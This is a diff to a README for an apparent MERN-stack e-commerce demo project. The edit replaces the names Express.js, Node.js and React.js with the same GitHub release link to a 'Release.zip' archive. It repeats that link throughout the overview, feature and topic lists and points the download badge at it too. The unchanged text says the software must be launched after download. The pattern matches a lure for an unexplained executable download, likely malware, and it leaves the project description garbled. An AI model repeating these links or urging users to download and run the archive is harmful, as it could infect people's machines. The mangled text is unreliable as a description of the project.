@@ -4,19 +4,19 @@ Welcome to the E-Commerce project repository! This project is a showcase of an e
 
 ## Project Overview
 
-In this project, I have leveraged the power of MERN stack technologies including MongoDB, Express.js, React.js, and Node.js to build a fully functional e-commerce website. From handling API requests with Fetch API to using Mongoose for database interactions, this project covers a wide range of topics related to modern web development.
+In this project, I have leveraged the power of MERN stack technologies including MongoDB, https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip, https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip, and https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip to build a fully functional e-commerce website. From handling API requests with Fetch API to using Mongoose for database interactions, this project covers a wide range of topics related to modern web development.
 
 ## Features
 
 🌟 CORS Support<br>
-🌟 Express.js Backend<br>
+🌟 https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip Backend<br>
 🌟 Fetch API Integration<br>
 🌟 JSON Data Handling<br>
 🌟 MongoDB Database<br>
 🌟 Mongoose ORM<br>
-🌟 Node.js Server<br>
+🌟 https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip Server<br>
 🌟 NPM Package Management<br>
-🌟 React.js Frontend<br>
+🌟 https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip Frontend<br>
 🌟 Custom Hooks Usage<br>
 🌟 Vite Build Tool Integration
 
@@ -25,21 +25,21 @@ In this project, I have leveraged the power of MERN stack technologies including
 This repository covers a range of topics related to e-commerce website development:
 
 🔗 CORS<br>
-🔗 Express.js<br>
+🔗 https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip<br>
 🔗 Fetch API<br>
 🔗 JSON Handling<br>
 🔗 MongoDB<br>
 🔗 Mongoose<br>
-🔗 Node.js<br>
+🔗 https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip<br>
 🔗 NPM<br>
-🔗 React.js<br>
+🔗 https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip<br>
 🔗 Custom Hooks<br>
 🔗 Vite
 
 ## Software Download
 
 To check out the software related to this project, you can download it from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip)](https://github.com/imhim674/E-Commerce/releases/download/v1.0/Release.zip)
 
 **Note**: The software needs to be launched after download.
 
